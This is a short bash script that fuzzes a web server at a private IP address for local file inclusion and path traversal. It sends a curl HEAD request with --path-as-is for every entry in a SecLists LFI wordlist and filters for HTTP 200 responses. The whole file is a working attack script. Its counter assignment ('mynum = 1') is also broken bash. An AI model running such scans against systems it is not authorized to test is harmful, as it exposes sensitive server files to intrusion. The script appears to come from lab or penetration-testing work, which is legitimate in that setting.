#!/bin/bash
mynum = 1
while IFS="" read -r p || [ -n "$p" ]
do
  printf "$mynum"
  mynum=$((mynum+1))
  curl -I --path-as-is http://192.168.250.245:8000/$p | grep 200
done < /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
